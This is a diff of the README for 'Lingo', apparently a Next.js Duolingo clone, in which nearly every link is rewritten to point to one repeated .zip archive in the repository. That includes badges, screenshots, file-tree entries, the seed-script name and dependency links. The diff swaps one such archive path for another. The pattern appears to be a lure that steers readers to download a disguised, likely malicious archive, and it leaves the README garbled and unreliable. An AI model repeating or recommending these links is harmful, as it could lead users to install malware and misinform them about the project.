@@ -2,16 +2,16 @@
 
 # Lingo - Interactive platform for language learning.
 
-![Lingo - Interactive platform for language learning.](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Lingo - Interactive platform for language learning.")
+![Lingo - Interactive platform for language learning.](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Lingo - Interactive platform for language learning.")
 
-[![Ask Me Anything!](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip%20me/anything?icon=github&color=black&scale=1.01)](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Ask Me Anything!")
-[![GitHub license](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip)](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "GitHub license")
-[![Maintenance](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip)](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Maintenance")
-[![GitHub branches](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip)](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "GitHub branches")
-[![Github commits](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip)](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Github commits")
-[![GitHub issues](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip)](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "GitHub issues")
-[![GitHub pull requests](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip)](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "GitHub pull requests")
-[![Vercel status](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip)](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Vercel status")
+[![Ask Me Anything!](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip%20me/anything?icon=github&color=black&scale=1.01)](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Ask Me Anything!")
+[![GitHub license](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip)](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "GitHub license")
+[![Maintenance](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip)](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Maintenance")
+[![GitHub branches](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip)](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "GitHub branches")
+[![Github commits](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip)](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Github commits")
+[![GitHub issues](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip)](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "GitHub issues")
+[![GitHub pull requests](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip)](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "GitHub pull requests")
+[![Vercel status](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip)](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Vercel status")
 
 <!-- Table of Contents -->
 <details>
@@ -46,9 +46,9 @@ Here is the folder structure of this app.
 ```bash
 duolingo-clone/
   |- actions/
-    |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+    |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
   |- app/
     |-- (main)/
         |--- courses/
@@ -56,20 +56,20 @@ duolingo-clone/
         |--- learn/
         |--- quests/
         |--- shop/
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
     |-- (marketing)/
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
     |-- admin/
         |--- challenge/
         |--- challengeOption/
         |--- course/
         |--- lesson/
         |--- unit/
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
     |-- api/
         |--- challengeOptions/
         |--- challenges/
@@ -79,70 +79,70 @@ duolingo-clone/
         |--- webhooks/stripe/
     |-- lesson/
         |--- [lessonId]/
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-        |--- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+        |--- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
   |- components/
     |-- modals/
     |-- ui/
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
   |- config/
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
   |- db/
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
   |- lib/
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
   |- public/
   |- scripts/
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
   |- store/
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
   |- types/
-    |-- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+    |-- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
   |- .env
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
   |- .gitignore
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-  |- https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+  |- https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
 ```
 
 <br />
@@ -157,7 +157,7 @@ duolingo-clone/
 ```env
 # .env
 
-# disabled https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip telemetry
+# disabled https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip telemetry
 NEXT_TELEMETRY_DISABLED=1
 
 # clerk auth keys
@@ -235,7 +235,7 @@ In the same terminal, run the following command to execute the seed script:
 npm run db:push && npm run db:prod
 ```
 
-This command uses `npm` to execute the Typescript file (`https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip`) and writes challenges data in database.
+This command uses `npm` to execute the Typescript file (`https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip`) and writes challenges data in database.
 
 13. Verify Data in Database:
 
@@ -247,19 +247,19 @@ Once the script completes, check your database to ensure that the challenges dat
 
 ## :camera: Screenshots
 
-![Modern UI/UX](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Modern UI/UX")
+![Modern UI/UX](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Modern UI/UX")
 
-![Quests](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Quests")
+![Quests](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Quests")
 
-![Shop](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Shop")
+![Shop](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Shop")
 
 ## :gear: Tech Stack
 
-[![React JS](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "React JS")](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "React JS") [![Next JS](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Next JS")](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Next JS") [![Typescript](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Typescript")](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Typescript") [![Tailwind CSS](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Tailwind CSS")](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Tailwind CSS") [![Vercel](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Vercel")](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Vercel") [![Postgresql](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Postgresql")](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Postgresql")
+[![React JS](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "React JS")](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "React JS") [![Next JS](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Next JS")](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Next JS") [![Typescript](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Typescript")](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Typescript") [![Tailwind CSS](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Tailwind CSS")](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Tailwind CSS") [![Vercel](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Vercel")](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Vercel") [![Postgresql](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Postgresql")](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Postgresql")
 
 ## :wrench: Stats
 
-[![Stats for Lingo](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Stats for Lingo")](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip "Stats for Lingo")
+[![Stats for Lingo](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Stats for Lingo")](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip "Stats for Lingo")
 
 ## :raised_hands: Contribute
 
@@ -269,62 +269,62 @@ You might encounter some bugs while using this app. You are more than welcome to
 
 Useful resources and dependencies that are used in Lingo.
 
-- Special Thanks to Kenney Assets: https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-- Freesound: https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-- Elevenlabs AI: https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
-- Flagpack: https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip
+- Special Thanks to Kenney Assets: https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+- Freesound: https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+- Elevenlabs AI: https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
+- Flagpack: https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip
 
-- [@clerk/nextjs](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^4.29.9
-- [@neondatabase/serverless](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^0.9.0
-- [@radix-ui/react-avatar](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^1.0.4
-- [@radix-ui/react-dialog](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^1.0.5
-- [@radix-ui/react-progress](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^1.0.3
-- [@radix-ui/react-separator](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^1.0.3
-- [@radix-ui/react-slot](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^1.0.2
-- [class-variance-authority](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^0.7.0
-- [clsx](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^2.1.0
-- [dotenv](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^16.4.5
-- [drizzle-orm](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^0.30.4
-- [lucide-react](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^0.359.0
-- [next](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): 14.1.4
-- [next-themes](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^0.3.0
-- [ra-data-simple-rest](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^4.16.12
-- [react](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^18
-- [react-admin](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^4.16.13
-- [react-circular-progressbar](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^2.1.0
-- [react-confetti](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^6.1.0
-- [react-dom](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^18
-- [react-use](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^17.5.0
-- [sonner](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^1.4.32
-- [stripe](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^14.22.0
-- [tailwind-merge](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^2.2.2
-- [tailwindcss-animate](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^1.0.7
-- [zustand](https://github.com/udaykiran176/duolingo-clone/raw/refs/heads/main/.github/clone_duolingo_weather.zip): ^4.5.2
+- [@clerk/nextjs](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^4.29.9
+- [@neondatabase/serverless](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^0.9.0
+- [@radix-ui/react-avatar](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^1.0.4
+- [@radix-ui/react-dialog](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^1.0.5
+- [@radix-ui/react-progress](https://raw.githubusercontent.com/udaykiran176/duolingo-clone/main/app/api/quests/duolingo_clone_extremeness.zip): ^1.0.3
